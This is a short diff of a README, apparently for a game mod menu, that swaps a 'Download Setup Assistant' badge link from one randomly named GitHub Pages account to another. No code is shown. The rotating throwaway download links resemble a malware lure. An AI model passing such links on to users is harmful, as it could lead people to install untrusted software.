@@ -6,7 +6,7 @@ Perfect for users seeking UI enhancements, solo gameplay control, and clean over
 ---
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ignaciochungbvro.github.io/.github/kiddions-menu)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://dominicholtsgna.github.io/.github/kiddions-menu)
 
 ---
 
